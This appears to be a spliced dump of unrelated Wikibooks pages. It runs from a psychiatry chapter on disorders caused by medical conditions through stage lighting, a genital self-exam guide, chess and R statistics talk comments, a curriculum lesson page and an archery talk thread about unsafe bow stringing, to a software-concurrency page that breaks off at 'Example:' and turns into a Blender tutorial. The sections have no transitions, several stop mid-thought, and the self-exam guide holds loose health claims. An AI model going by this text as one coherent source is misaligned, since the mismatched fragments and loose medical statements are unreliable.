''Case vignette: A 63 year-old banker was fired for inappropriate sexual advances toward employee. He was subsequently picked up by the police for urinating in parking lot of exclusive restaurant and shouting obscenities. His wife described him as &quot;just not himself over the past couple of months—it\’s like he has no self-control and no conscience.&quot; Neurological exam in the psychiatrist\’s office was essentially within normal limits, with no &quot;focal&quot; findings, except for abnormal grasp reflex (a tongue depressor repeatedly placed in the patient\’s hand led to his repeatedly grasping it). Magnetic resonance imagery (MRI) showed a large meningioma of the orbitofrontal cortex''.  

''Catatonic Disorder Due to General Medical Condition''

	&quot;Catatonia&quot; is probably best conceptualized as a syndrome with markedly diverse etiologies. Fink and Taylor (2006) have proposed three catatonia subtypes (''nonmalignant'', ''delirious'', and ''malignant'') and four specifiers (secondary to: mood disorders, general medical conditions or toxic states, neurological disorders, or psychotic disorders). 
When no identifiable medical or neurological cause is present, about 40% of cases prove secondary to mood disorders, whereas only about 10% are associated with schizophrenia (Sadock &amp; Sadock, 2007). Catatonic disorder due to GMC is not a well-studied phenomenon, and its prevalence has not been clearly established. Features include ''immobility, psychomotor agitation, mutism, negativism, grimacing, peculiar motor behaviors (such as assuming and maintaining unusual postures, sometimes characterized by &quot;waxy flexibility&quot;), echolalia, ''and ''echopraxia.'' Medical and neurological causes of catatonia include drug toxicity, including neuroleptic malignant syndrome (NMS), CNS neoplasms, encephalitis, head trauma, lesions of the fronto-subcortical circuit, and contralateral parietal lobe lesions (Ovsiew, 2008). When catatonia is accompanied by fever and autonomic instability, it may represent ''malignant catatonia'', a potentially lethal form of catatonia which needs emergent treatment with electroconvulsive therapy (ECT) (Fink &amp; Taylor, 2006). 
''Case vignette: A 53-year old male presented to a psychiatrist with a provisional diagnosis of &quot;late onset schizophrenia.&quot; The man had in fact been functioning quite well until about a year ago, when he developed insidious signs of forgetfulness, apathy, and abulia (loss of spontaneity and effort). Recently, he had also developed leg weakness and &quot;fainting spells.&quot; However, his presentation to the psychiatrist was one of mutism and marked decrease in voluntary movements of any kind; indeed, the psychiatrist described the patient as &quot;grossly catatonic.&quot; Given the atypical age of onset for schizophrenia, and history of leg weakness, an MRI was ordered. It revealed &quot;ventriculomegaly; hydrocephalus secondary to subthalamic mesencephalic tumor involving the third and the lateral ventricles.&quot; Surgical placement of a ventriculoperitoneal shunt led to resolution of the catatonia over a period of several days (Neuman et al, 1996). ''

''	Amnestic Disorder due to GMC''

''	Amnestic disorders'' entail impairment in the ability to learn new information, or to recall previously learned information''. ''Amnesia is most commonly found in patients with a history of ''alcohol abuse'' or ''head injury'', in which bilateral damage to mid-temporal lobe structures (such as the hippocampus, mamillary bodies or amgydala) has occurred. In the DSM-IV, the two primary categories are ''amnestic disorder due to GMC'', and ''substance-induced persisting amnestic disorder''. The latter will be discussed in chapter (   ), in relation to alcohol and benzodiazepine use. 
	Numerous GMCs may produce amnestic disorder, including ''thiamine deficiency, hypoglycemia, carbon monoxide poisoning, hypoxia, ''and'' herpes simplex encephalitis'', all of which tend to produce bilateral hippocampal damage (Sadock &amp; Sadock, 2007). 	Korsakoff\’s Syndrome (KS) is characterized by marked amnestic symptoms in the presence of generally preserved cognitive function in other spheres. Essentially, KS is the chronic amnestic phase of ''Wernicke-Korsakoff Syndrome,'' which is discussed in chapter (   ). Though the predominant defect in KS is usually ''anterograde'' amnesia—i.e., impaired ability to retain new memories--there is often a ''retrograde'' amnestic component as well. Usually, there is relative sparing of remote memory. Lishman (1998) has noted that the line between Korsakoff\’s Syndrome and so-called ''alcoholic dementia'' is not always sharp, and there are most likely gradations or intermediate states between these two conditions.  KS–though conventionally attributed to thiamine deficiency—is closely associated with ''alcohol abuse and dependence''. Indeed, Lishman (1998) goes so far as to opine that, &quot;…the rarity of a fully fledged Korsakoff syndrome as a residue of thiamine deficiency in non-alcoholics raises the possibility that a direct neurotoxic action of alcohol may play some part in the evolution of the condition (p. 582). 

'''Medical and Laboratory Evaluation for Psy-GMC'''

'''	'''Given the prevalence of undetected medical illness in psychiatric populations, it is incumbent upon the physician to treat all putative &quot;psychiatric&quot; symptoms with a certain degree of skepticism'''. 	'''As noted earlier in this chapter, one\’s degree of suspicion is raised when the patient presents with a recent change in mental status, particularly when this occurs in temporal proximity to a known medical illness or drug-related event. Atypical presentations; late-life onset; and illness that fails to respond to standard therapies should all raise ones suspicion of a medical cause. The basic &quot;work up&quot; of suspected psychiatric symptoms due to GMC is outlined in Table 4. 
'''			(Table 4 about here) '''

''Treatment of Psy-GMCs''

''Treatment'' of individual Psy-GMCs is beyond the scope of this chapter, since it necessarily focuses on primary treatment of the numerous underlying medical conditions. Symptomatic treatment with psychotropic agents may be conservative for Psy-GMCs, and depends on whether the predominant disturbance is in the realm of mood, reality testing (psychosis), anxiety, personality, etc. Though psychotropics aimed at a particular GMC-related symptom may sometimes be useful—e.g., antipsychotics for &quot;organic&quot; psychosis, or antidepressants for depression due to a GMC—most psychotropics run the risk of further clouding the patient\’s mental state, or introducing side effects and drug-drug interactions. Nevertheless, there is a role for judicious use of psychotropics in certain instances; e.g., antidepressants in post-stroke depression, or depression related to Parkinson\’s disease.

      <text xml:space="preserve">Lighting for the stage involves manipulating the four major Controllable Qualities of light; Intensity, Color, Direction and Movement; to influence the four functions of stage lighting which are Mood, Selective Focus, Modeling and Visibility.

'''Four Controllable Qualities of Light'''
*Intensity--The intensity of a light source can vary from near total darkness to painfully bright.
*Color--Nearly any color you can think of can be created through the use of lighting gels or electronic means.  Color can be a major player in creating a mood.  However, the lighting designer must be careful in choosing colors so that they coordinate with the colors chosen for costumes and set pieces as well.
*Direction--This is the area from which the light approaches the stage.  This is a major contributor to the function of modeling.  Light can come from below, directly above or anywhere in between.  They can also originate from in front of the actors, behind them or off to a side.  Each combination of directions has its unique effect on the highlights and shadows produced.
*Movement--refers to the changing in the lights whether it be a change in intensity, color or direction of origin.

'''Functions of Stage Lighting'''
*Visibility is the primary function of stage lighting:  making sure the audience can see the part(s) of the stage that the director and/or the lighting designer want them to see.
*The modeling function includes creating a realistic (or intentionally non-realistic) view of the world of the play.  This is done by strategically placing lights above, below, to the side, in front and behind the actors.  Through the use of the placement of the lights, you can create different types of highlights and shadows on the actors, props and set pieces.
*Selective Focus is the function of &quot;forcing&quot; the audience to look where it is desired for them to look through the use of high/low intensity and changes in intensity.
*The function of Mood is both one of the most difficult and at the same time the easiest function to maintain.  It is the easiest because it can be done very simply through the use of colors.  However, it can also be overdone to the point of becoming cliche instead of allowing the actors and other aspects to contribute to the overall mood of the play.

      <text xml:space="preserve">==What is a Genital Self Examination?==

A genital self exam is used to check for signs and symptoms that might indicate the presence of a sexually transmitted infection (STI) or to find any abnormalities that could indicate a more serious problem such as cancer.

A genital self exam, sometimes referred to as a GSE, is very important for both men and women to perform on themselves. Once a month is the time to physically explore an area of your body that is often overlooked, and to be on the hunt for anything that appears out of the ordinary. It is very important to become familiar with your genitalia upon reaching puberty in order to detect the difference between what is normal and what is not. This provides a baseline to compare future exams to so you can notice if something has changed.  A genital self exam is used to check for signs and symptoms that might indicate the presence of a sexually transmitted infection (STI) or to find any abnormalities that could indicate a more serious problem such as cancer. Quite often a person will find nothing at all, but it is always best to confirm regularities rather than let something go untreated because it was not noticed.

==Why is a GSE Important?==
Genital self exams are extremely important because they are what can help determine if a sexually transmitted infection or abnormality is present. &lt;br /&gt;&lt;br /&gt;
Unfortunately, there are many STIs that go unnoticed and thus are not treated because the person does not realize they have one.Often there are many STI’s that have similar symptoms to one another which are easily confused amongst each other as well as other diseases, and other STI’s that go away on their own, but will always come back if they go untreated. It is important to know this because if you were ever to find something, it should be brought to the attention of a health professional so that you can be tested before spreading it to anyone else.&lt;br /&gt; 
Genital self exams are significant to a person’s health and well being because they help to detect and prevent further complications that could arise with the contraction of an STI. Without treatment, long term effects of STI’s can include infertility, heart disease, neurological damage, as well as physical scarring and damage to internal and external genitalia. The sooner something irregular is found and treated, the shorter the recovery period and the lesser the chance of suffering from serious health complications. 

==Who should perform Genital Self Exams?==
As mentioned earlier, it is important for each individual to become familiar with their body around the time that they begin sexual maturation. More specifically both men and women should begin performing these self exams around the age of fifteen and should continue throughout the duration of their life. 

==How Often and When Should a GSE be Performed?==
It is recommended to perform a GSE at least once a month and the best times to complete it would be after a warm bath or shower which relaxes both the mind and muscles making the exam easier.

==What You Are Looking For==
When doing a self genital exam it is important to look for things that are new, or were not there before. You want to look for things such as sores, discharge, and other problems such as genital warts.

''Females''- should be looking for regular discharge which is usually a cloudy white color. This should normally smell almost like vinegar. Depending on where in the menstrual cycle a female may be the thickness may differ. During the exam there should be no pain. If there is this could indicate an infection. If this discharge smells or looks different it could indicate a problem which should be checked out by a doctor. Also if you find anything that you feel isn’t supposed to be there or hurts, you should get checked.

''Males''- should be looking for bumps and lumps on or in the testes. Also anything abnormal or things you notice that are different should be looked at by a doctor. Testes that have not descended or “dropped” shortly after birth can be at risk for testicular cancer. Also look for swelling or shrinking of either the penis or testes. This can be an indicator of a problem along with any other visible differences. Regardless of age self genital examinations should be done regularly for boys or men. Lumps found in the testes which could be testicular cancer are usually painless and swollen. 

==Prevention==
By doing these exams on themselves it can prevent passing an STD onto your partner if you notice it soon enough. In order to prevent this from happening you must educate yourself on how the symptoms of an STD my feel and look. 

As teens grow up they go through changes with their bodies which also can cause them to be unsure what is happening with their body and if it is normal or not. It is important for teens who are having sex to make themselves aware of what is out there and also educate themselves with what is normal changes for their body to go through and things to keep on the lookout for that are not. Self genital exams can help find a problem if there is one.

It is important to remember that not all STDs turn up right away, some can take up to six months to turn up in the blood.

''Male''- Self genital exams can prevent testicular cancer or catch it before it is too late. Catching testicular cancer at its earliest stage is the easiest and most curable case. Self genital exams can also prevent STD’s as well for males. 

''Female''- Self genital exams and help woman prevent from STD’s as well. It is harder to predict cancers for females though such as cervical because it is within the body. It is important to get your annual checkups by your doctors to prevent such things. 

==What to do if you find something after doing a genital self exam==
If one finds something abnormal when doing a self-exam, an appointment should be made with one’s physician immediately. A private doctor is sufficient, as well as a family planning clinic. However, one should know that when dealing with a family planning clinic, the fee one is asked to pay may be different depending on the client’s income. One should make sure to check about the payment options before visiting.

With men, if a lump or swelling of the testicle, or even a pain in the lower stomach or groin area a health care provider should be contacted immediately to get a check for testicular cancer. If found soon enough, the cancer can be cured when dealt with properly.

==Easy Tips to Remember==

For ''Women''
:-	Squat, stand, or sit over a mirror
:-	Look for white, reddish areas around the vulva as well as any new moles or freckles.
:-	Any sudden changes in the color or appearance of the skin should be taken seriously.
:-	Slight changes in color around the vulva will occur depending on exercise, age.
:-	Check for sores, small cuts,  or lesions as well as any lumps.

For ''Men''
:-	Look for a change in color or appearance with the scrotum.
:-	Use the middle and index fingers under the testicle with a thumb on top.
:-	Roll the testicle between the fingers, noting any lumps, firmness of the testicle or painful areas.

The entire genital area should be checked including the penis, upper thigh area, and any other area near the genitals.
:-	In this case one should look for lumps or sores anywhere around these areas.
:-	Check for any involuntary discharge from the tip of the penis.

==Risks of Performing an Exam==
The only risk to doing a genital self-exam is if a male squeezes the testicles too hard when checking them. This will result in a subtle pain in the abdomen.

12. Nbd2 is impossible as a pawn is occupying the square. Also, 12...Bf8 is impossible as a rook is occupying that square. It seems that a move &quot;11.5&quot; is missing (11.5. d4, Re8).</text>

      <text xml:space="preserve">== &quot;Summing up for all values gives us Y = 7.0000.&quot; ==
There's an issue here. The original vector is: &lt;br&gt;
&gt; wiki1$var1&lt;br&gt;
[1]  88  93 110  76  78 121  92  86&lt;br&gt;

The standardizd vector is: &lt;br&gt;
&gt; wiki1$Z.var1&lt;br&gt;
[1] -0.3245  0.0000  1.1033 -1.1033 -0.9735  1.8172 -0.0649 -0.4543&lt;br&gt;

The sum of all the values of the standardized vector is: &lt;br&gt;
&gt; with(wiki1, {sum(Z.var1)})&lt;br&gt;
[1] 1.110e-16&lt;br&gt;

, which is zero, and by no means &quot;7.0000&quot;. Then, how is 7 obtained? And what does Y stand for?</text>

Hello and '''[[Wikibooks:Welcome, newcomers|welcome]]''' to [[Wikibooks]], a collection of open-content textbooks!

You should consider [[Special:Userlogin|creating an account or logging in]]. Here are some advantages:

* A username of your choice.
* Greater security and privacy, as your IP address will be hidden from most users.
* Your own personal user page and talk page.
* [[Special:Contributions/{{PAGENAME}}|Your contributions]] will directly attributed to you.
* The use of your own [[Help:Watching pages|watchlist]] to monitor pages that you are interested in.
* Your opinions carry greater weight in the [[Wikibooks:Decision making|decision making process]].
* You become a recognized member of the Wikibooks community.

We hope that you choose to become a Wikibookian and [[Special:Userlogin|create an account]].

Feel free to ask any questions on my talk page or in the [[Wikibooks:Reading room|Reading room]].
Be sure to sign your talk page comments with four tildes (&lt;nowiki&gt;~~~~&lt;/nowiki&gt;).

| {{#if:  | |&lt;!-- this is so if anyone tries to use it where it doesn't go they will know. --&gt;
{{mbox|type=warning|This template must only be used on '''User [[Help:Talk page|discussion]]''' pages.}} }} }}

Your first few edits may be seen as problematic. You removed an image from [[Hindi]] and swapped the order of flags on [[Urdu/Cover]]. Given the potential sensitivity of the latter, I undid that edit. If you feel that these are productive edits, please make a note of the rationale in the edit summary and/or on the [[Help:talk page|talk page]]. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 15:18, 13 March 2009 (UTC)</text>

== Main Questions: ==

How are these definitions &amp; influences changing with the emergence of information society and globalization? What is the role of personal computing devices in this change?
 

== Objectives ==

Students will be able to:

*Define terms
*Discuss the role information society has played in defining the curriculum
*Identify how computers have changed the way students learn
*Discuss how information society characterized by computers and media have influenced curriculum development

== Definitions ==

'''Curriculum''': course of study offered by an educational institution.

'''Information Society''': a society in which the creation, distribution, diffusion, use, integration and manipulation of information is a significant economic, political, and cultural activity (Wikimedia, 2008).

'''Industrial Society''': &quot;...refers to a society with a modern societal structure.&quot;; i.e. industrial revolution. &quot;...generally mass societies.&quot; (Wikimedia, 2008).

'''Globalization''': &quot;...process of transformation of local or regional phenomena into global ones.&quot; &quot;...people of the world are unified into a single society and function together.&quot; (Wikimedia, 2009).

'''Society''': “…population of humans characterized by patterns of relationships between individuals that share…distinctive culture and/or institutions”. Broader: “…economic, social and industrial infrastructure, made up of a varied multitude of people.” (Wikimedia, 2009).

'''Political''': of or concerned with government, the state, or politics (LoveToKnow, 2009).

'''Economic''': of or relating to the production, development, and management of material wealth, as of a country, household, or business enterprise (Yahoo! Education, 2000).

'''Information Literacy''': the ability to identify what information is needed and the ability to locate, evaluate, and use information in solving problems and composing discourse.

== Introduction ==

Society, Political, Technological, and Philosophy not only influence today's curriculum, but they influence each other as well.  Each affects and is effected by one or more of the other.  Industrial and Informational Societies are heavily influenced by these four points.  Industrial Society curriculum was based on occupations and jobs that were based on individual performance and foundational objectives.  Currently, we are moving from an Industrial Society (a society evolved from the influences of John Franklin Bobbitt and Werrett Wallace Charters) that has always prepared students, and even adults, for the inevitability of working in meaningless jobs to Informational Society (a society evolved from John Dewey and Ralph W. Tyler) which has pushed us past just working at meaningless jobs to thinking about careers that bring them more enjoyment and better paying wages, which, in turn, make the curriculum mean something more to the student/adult.

In keeping with this phenomenon of today's school curriculum, we can see how heavily influenced the emergence of the Information Society really is. Furthermore, social accountability and other domestic pressures also influence how we see the school curriculum. Information Society is the notion that information sharing and development are the key aspects of modern society. In this vein, modern curriculum requires us to be more information centered. As of now, learners are being prepared to master subject matter as well as to master the use of technology and higher level cognitive skills instead of just pushing towards only working towards a meaningless and unappealing job. 


== Curriculum Approaches and Definitions ==

The information age curriculum is directed by societal influences that are more global and more technology driven.  In this sense, curriculum is seen as both school based (formal) and life based (informal). In a globalized society the curriculum is becoming more directed towards creativity and innovation with technology.  In this age there is a need for more learner centered instruction, hands on approaches to learner and more authentic learning experiences. As a result curriculum has come to mean more than a &quot;planned series of educational experiences&quot; (). 
 
To be sure, these new approaches to curriculum is consistent with the Progressive school of curriculum theorists dating back to John Dewey.  Following Dewey's model for learning:  Become aware of the problem, define the problem, propose a hypothesis to solve the problem, evaluate what would happen using past experiences, and test the best solution.  Having students learn from their own experiences and being able to use those experiences for future problems is an important approach to Dewey's model.  The jobs in the future will require critical thinkers and problem solvers.  We are no longer teaching children for industrial jobs, but jobs that need a more communicative individual who can use experiences to their benefit.   
 
Tyler's approach was that of the &quot;Four Basic Principles&quot;.  You must first find the purpose of the school.  Next, create educational experiences for the purpose of the school.  Then, you must organize the experiences.  Finally, you must evaluate the purposes.  To find the purpose, you must look at three things.  You must look at the learner (student), the subject matter, and society.  By looking at these three things, you will have a better understanding on what your approach should be for your purpose (objectives). 
 
&quot;How we conceive of curriculum and curriculum making is important because our conceptions and ways of reasoning about curriculum reflect and shape how we see, think and talk about, study and act on the education made available to students&quot; Cornbleth(1990). 

There are many definitions for curriculum.  Bobbitt, Dewey, and Tyler believe/d curriculum needs objectives.  You need to know beforehand what you need to accomplish.  Bobbitt believed that curriculum was a way to prepare the student for industrial life.  Bobbitt, Charters, Dewey, and Tyler also believe/d in curriculum as a science.  You have to study the world around you to find the best ways to teach your students.  These educators also needed to know what are the students' needs.  What do they need to know to succeed in the world.  During the time of the Industrial Society, the classroom was the only place where students learned how to be citizens.  How to survive in this job environment.

== Information Society ==
 
Information society is characterized by the global distribution of information as distinct from industrial society which is characterized by the use of external energy sources such as petroleum to build a larger and stronger community.  Some theorist believe we are in the middle of a transition between Information and Industrial societies due to global technologies.  Computers and different media are the tools in an Informational Society.  &quot;Progress in information technologies and communication is changing the way we live: how we work and do business, how we educate our children, study and do research, train ourselves, and how we are entertained (Chair's conclusions from the G-7 Ministerial Conference on the Information Society, February 1995).

Having students working in cooperative groups helps build a strong foundation for work place problem solving skills.   Creating an environment also help students recognize patterns and envision dynamic models. These curricular approaches improve success for all types of learners and may differentially enhance the performance of at-risk students.  &quot;Just as information technology has improved effectiveness in medicine, finance, manufacturing, and numerous other sectors of society, advanced computing and telecommunications have the potential to help students master complex 21st century skills. Research-based curriculum projects are developing technologies that enable online virtual communities of practice using advanced tools to solve real world problems.&quot;(Dede)  

One of the five essential skills an employee will need in the future workplace is Information literacy.  Educating students on the power and scope of information involves communicating and explaining how information is organized.  It is also important for the student to show through a variety of sources.  This includes the tools to evaluate, organize and apply the information to problems and situations.
 

== Role of the Computers ==

There are many different and unique methods computers have for enhancing the learning in the classroom.  Some of these include:
 
*taking real situations/problems that adults face every day and applying them in the curriculum
*using &quot;advanced tools similar to those in today's high-tech workplaces&quot; (Linn 1997) within the classroom
*creating concepts, skills, and complex products (Schank, Fano, Bell, &amp; Jona 1994) through the use of long-term projects;
*using visuals to illustrate the differences of experiences
*incorporating collaborative experiences to supply different perspectives that the students can share
*&quot;developing learning experiences and generating knowledge&quot; (Scardamalia &amp; Bereiter 1994) with those with real world experience
*fostering success for all students through special measures to aid the disabled and the disenfranchised (Behrmann 1998) 

 
To implement these capabilities you will need a large-scale, pedagogy, assessment, and professional development, along with administration support.  Most programs need an organized group to continue to  research and expand the knowledge of understanding of the topics.  Without these working together, the program will not work.

== THE ASSURE MODEL ==
 
==Analyze Learners ===

The first step of the ASSURE model is to identify the learners.  The target audience can be a certain grade level, a specific or a particular group.  The audience can be analyzed in terms of:  

1.       General characteristics  

2.      Specific entry competences or  

3.      Learning styles 

 

General Characteristics: Describe general characteristics of the learners, such as age and demographic information. 

Entry Characteristics: Characterize the learner or learners. 

Learning Styles: Enter information about students’ learning styles. 

===State Objectives ===

The objectives should be stated next and should be as specific as possible.  These are statements as to what the learner will be able to do at the end of instruction.  The conditions under which the students is going to perform and the degree of acceptable performance. 

The Helpful Hundred list includes suggested action words that contribute to the creation of effective objectives. 

===Select Methods, Media and Materials ===

Next are the methods to be used along with the listings of media and materials necessary to enable learners to meet the stated objectives. 

Methods: Describe the methods used to implement the lesson to the audience you described, to order to achieve the objectives listed on the previous screens. 

Media: List any multimedia you intend to use. 

Materials: This is a list of learning materials used, such as art supplies, textbooks, or interactive learning guides. 

When selecting materials you can: 

1.       Select available materials 

2.      Modify existing materials 

3.      Design new materials 

===Utilize Media and Materials ===

Create and view the plan for using the selected media and materials to implement the methods of your lesson plan. 

Environment Preparation: Outline necessary actions to prepare the environment, including the classroom, facilities, resources, and any equipment that will be used. 

Audience Preparation: Describe the plan for preparing the learners to complete the lesson, including any preparation, skills, or groupings that are necessary to use the materials and media included in the lesson.   

Students may use the media and materials individually, as in self-instruction, or in small groups, as in cooperative learning.  They may use printed materials, such as workbooks, or computer-based technology, such as the internet. 

===Require Learner Participation ===

To be effective, instruction should require active mental engagement by learners.    There should be activities that allow learners to practice the knowledge or skills and to receive feedback on the appropriateness of their efforts before being formally assessed. Outline activities that allow learners to practice their knowledge and skills and receive feedback on their progress. 

====Initial Activities ====

Create a plan for the active learning process. 

Questions to Ask: Identify questions that will help learners focus and understand the objectives. 

Activities to Do: Plan activities that require learners to practice skills that build toward the objective, require participation, and allow for immediate feedback. 

Skills to Practice: List skills that learners must master in order to achieve the objectives of the lesson. 

====Follow-Up Activities ====

Plan activities that provide reinforcement and further opportunities for learners to build upon skills and goals defined by the objectives.  

===Evaluate and Revise ===

After assessing individual students, characterize the results for this lesson. Evaluate the effectiveness and impact of the lesson plan in helping learners meet the objectives. 

Learner Evaluation Plan: Create a plan for evaluating student learning. Design assessments that reflect the acceptable performance defined for each lesson objective. 

Evaluation of Learner Achievement: Determine the effectiveness of the lesson plan and consider how it can be revised.  

Methods and Media Evaluation: Evaluate the effectiveness of the methods, media, and materials in assisting the learners meet the objectives.

Hi,

In light of the note you added to the [[Adventist Youth Honors Answer Book/Recreation/Archery|Archery Honor]], I rearranged the section a bit to make your warning more prominent.  I'd like very much if you would review the changes I made and make any corrections you feel are necessary.  Thanks for pointing out the problem.  --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 18:48, 13 March 2009 (UTC)

That was fast. Thanks for updating the page. It looks fine. Push Pull is a time honored method of stringing, but I've met at least one person in person who almost lost an eye to it, and plenty of others in archery forums, so the method is now counter-indicated by associations like the NAA, NFAA and FITA. Push pull was probably relatively save with English longbows, which are sufficiently long such that only the flat of the bow could hit your head. Recurve bows, on the other hand, curve back so that the limb forms a hammer-like striking tip which is perfectly aligned with your temple (the thinnest part of the skull) or your eye socket, which is why the method is so dangerous--even with a light bow. I've even read one claim of a death caused by the method-but I'm unable to locate that claim and verify it. 

I'm sorry that I'm too much of a noob to properly link my claim in the article to the citation I provided in the references section. There is a 4th method of bow stringing that uses a foot loop, one that is simple and easy and one that is safe for bows and people, but I don't have a free image of it yet. I'll post some time when I do.
----
Excellent.  I'll add the citation link in a bit.  We don't do a whole lot of that in Wikibooks like they do in Wikipedia, so I'll have to figure out how to do it (again).  It's not that hard - I just don't remember how. 

I do keep a pretty close eye on this book, making several checks on it per day.  There ''are'' vandals about (though they don't seem to specifically target this book - just Wikibooks in general).  The main criticism I hear against this resource is that anyone can change it in a most unsavory way.  But I think that could well be its main strength - you are an anonymous editor who has corrected potentially dangerous advice.  Static print-only versions of these resources cannot be fixed once they're out there, and even then, new copies are not updated frequently.  Thanks so much for the info.  Also, you might consider creating an account.  --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 21:15, 13 March 2009 (UTC)

I may have one. Is it different from Wikipedia? (I suppose I could look it up). I hadn't come here with an eye to changing the book, I was just following a google image link and happened to noticed the outdated advice about push pull stringing...

As to the citations, I can see why they might not be as common in wiki books (which I hadn't heard of until today) but they seem like a good idea in that they don't hurt anything and provide an extra level of confidence in the material. I figured a mod might check on the claim I added and I figured a cite would give them some confidence in the veracity of the claim.
----
The citation is now in place.  A picture paints a thousand words, and in this case, those words are very convincing.  Most of the images that appear on Wikipedia are hosted by the Wikimedia Commons which makes them equally available on Wikibooks (the two projects are run by the same organization).  Please take a crack at adding the section.  If you mess up the formatting, I will happily fix it.  It's nice to get competent contributions! --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 21:25, 13 March 2009 (UTC)

A question for you. The book title is &quot;Adventist Youth Honors Answer Book/Recreation/Archery.&quot; How morphable are wikibooks? Were the title just about archery, I'd figure it would be open season to modify the book with the goal of providing clarity about archery (specifically recurve target archery, which seems to be the area of expertise of the author) but there is also the issue of of the &quot;Adventist Youth Honors.&quot; &lt;s&gt;Is this a text book that must conform to a specific Adventest program or set of goals?&lt;/s&gt; Ah, I see that the Adventist Youth Honors is a very specific program. Well, the Push Pull method needed to be noted as dangerous, and hopefully that won't mess up students on their tests for this requirement. And given the very specific nature of this text, there isn't much I can add to it since I don't wish to mess up the congruence with the Honors program requirements, even though some of them are outdated.
----
Yeah, this is very much structured for a specific program.  The requirements for the honors are set by a committee and I have no authority to change them.  But when I see something I think ought to be changed, I tag it (see requirement 8 for an example).  Mark West, a professional archer who put most of these answers together also believes that this honor ought to be overhauled completely.  

If you'd like to start your own archery book, I encourage you to do so.  For starters, you could cut-n-paste this one and then morph it into whatever form you desire.  Lemme know if you decide to do that so I can help you preserve the edit history from here.  Or if you don't want to use this work as your starting point that's OK too.  To start a new book, just click [[Archery]] and start editing.  If you do undertake such an effort, there are concrete advantages to registering.  Believe it or not, your anonymity is ''more'' anonymous if you register (if you prefer to remain anonymous anyhow).  If there's any way I can help you, just let me know. --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 22:23, 13 March 2009 (UTC)

I'd have to go with Mark West on this one. Archery has changed since the text in question was originally written. Mark West is clearly qualified to tell you what to change if anyone is. I know how tough it can be to get a change through a large organization, though. As to some of your proposed small changes, I don't think it makes sense to use metric conversions to identify the targets in the specifications. FITA targets are always referred to by their metric size (60 cm, for example) and never by Imperial measurements. Since people have to purchase these targets there is no value in providing an Imperial measurement which will not aid in the acquisition of the said targets. Imperial equivalent for the distance, though, has some utility. Also, the term Olympic bow, while descriptive, is no longer strictly accurate. Such bows are more officially referred to as FITA Recurve bows, but given all the different classes of bows it might make sense for the proposed changes to just say what they mean: A Recurve bow with a sight, stabilizer and clicker. However, beginners are typically taught to use recurves with no sights, no stabilizers, nor a clicker, so I'm not sure requiring such bows is really a realistic idea for a beginning archery merit program.


I'd also love to see someone provide equivalent content for you to replace the outdated (not completely outdated, though) and out of print 1974 NAA Instructor's manual. The chance of a student ordering an out of print copy to read the recommended chapters is rather low. There are a number of free resources on the web that might provide some equivalent material for you to refer people out to: 

Archery Australia: Basic and Advanced:
http://www.archery.org.au/scripts/cgiip.exe/WService=ASP0009/ccms.r?pageid=10282

FITA Basic and advanced:

Beginners Manual
http://www.archery.org/UserFiles/Document/FITA%20website/04%20Development/Beginners_Manual/BeginnersManuel-e.pdf

Coaching Manual
http://archery.org/content.asp?id=1036&amp;me_id=836&amp;cnt_id=2625

and the Archer's Reference, by Murray Elliot.

http://www.archersreference.co.uk/download.html

Because of these excellent materials which are available free, online (though not open source), I'm unlikely to start an archery wiki book unless I see an under-served area where it would provide value that is not already served. Unfortunately, none of these materials is open source, so the future availability is not guaranteed, though there are some archery sites like Texarch.org that tend to have mirror copies.
----
Thanks for all the advice.  Sometimes a club director can replace a requirement with something requiring equivalent effort.  I think it would be totally acceptable to use the books you have mentioned to meet such a requirement. --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 23:47, 13 March 2009 (UTC)</text>

      <text xml:space="preserve">Before we take a look at advantage and disadvantage let us one think save in our mind. Mostly performance advisement come first in the (object oriented) software design phase. We don't need advisement over performance in the (object oriented) analyse - normally. The problem analyse can be some important fundamentals, and these can help us for performance advisement in the (object oriented) design.

&lt;noinclude&gt;__TOC__&lt;/noinclude&gt;
==Concurrency==
Concurrency is an to check when we are in software analyse phase. With concurrency we describe side by side running pieces of our software. Which can lead to better performance, if the concurrency allows for work to be completed while waiting for IO, or if the CPU support concurrent threads of execution. Even though concurrency can lead to improved performance on both single, and multiple core CPUs concurrency incurs some overhead, and can actually decrease performance if done incorrectly, or in excess.

But only You as specialist can identify software pieces, which may running side by side. The Unified Modelling Language [UML] can help us to display concurrency in activity diagrams. These parts of software are painted between synchronize elements. It is important to create concurrency with right dimension. If they are to small, so it comes too little using, are they to big we have an user problem.

Example:

Blender is a powerful and complex 3D modeling and rendering package.  Before you can use it effectively to ''make'' things, you need to ''know'' a few things about how it works:
* the process of 3D modeling and rendering (what Blender does)
* some rudiments of 3D analytic geometry (axes and coordinates)
* orthographic and perspective views of a 3D object
* local coordinate systems and child objects
* the fundamentals of Blender's user interface (hotkeys, windows, and menus)
* how to view a 3D scene from different vantage points (in Blender)

This unit is entirely devoted to this sort of background knowledge.  You won't create your first Blender model until the next unit.

Knowing this, you might be tempted to skip ahead.  Depending on your background, this might or might not work.  For instance, if you've used other 3D graphics packages, you might be able to skim (or skip) ahead as far as the user interface tutorial.  But if there's any doubt, please proceed through the tutorials in sequence.

'''Blender is not the kind of software you can launch into and grope about until you find your way.  It's not like exploring an unfamiliar city.  It's more like flying a spaceship.  If you hop into the pilot's seat without knowing the fundamentals, you'll be lucky to ever get off the ground, and it'd take a miracle for you to reach your destination safely.'''

===A Word about Jargon===
Like any subject, 3D modeling has its own jargon:  terminology specific to the subject and ordinary words that have special meanings in the context of computer graphics.

In this book, important new words are {{B3D:N2P/FirstUse|highlighted}} on first appearance and defined soon after.  If you suspect you've missed (or forgotten) the meaning of a word, try looking it up in the [[../Blender Glossary|Glossary]].

===Things You'll Need===
In order to work through the tutorials, you'll need access to a computer that has Blender installed ([http://www.blender.org/download download the latest stable release]).

Depending on what is installed on your system you may also need the appropriate Python installation. Each version of Blender works only with one specific version of Python, which is generally included in the download.
{| class=&quot;wikitable&quot;
|-
! Blender version !! Python version
|-
| 2.49 || 2.6
|-
| 2.5x || 3.2
|-
| 2.6 || 3.3
|}

{{B3D:N2P/Hidden begin|title=Installation instructions}}
Since Blender is open-source software, you can download the source code and build it yourself, but it's easier to download a pre-built install package.  Install packages are provided for each supported operating system:
* Microsoft Windows (32-bit and 64-bit)
